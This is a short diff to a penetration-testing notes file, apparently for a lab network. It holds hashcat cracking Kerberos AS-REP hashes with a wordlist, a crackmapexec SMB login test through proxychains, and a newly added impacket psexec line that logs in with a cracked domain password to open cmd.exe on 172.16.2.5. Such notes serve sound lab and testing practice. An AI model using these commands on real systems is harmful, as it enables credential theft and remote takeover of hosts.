@@ -10,6 +10,8 @@ hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force -o crack
 
 #testing Password
 sudo proxychains python3  /usr/lib/python3/dist-packages/cme/crackmapexec.py smb 172.16.2.5 -u 'jbercov' -p 'passs123'
+proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py DANTE.ADMIN0/jbercov:passs1237@172.16.2.5 cmd.exe
+
 
 
 
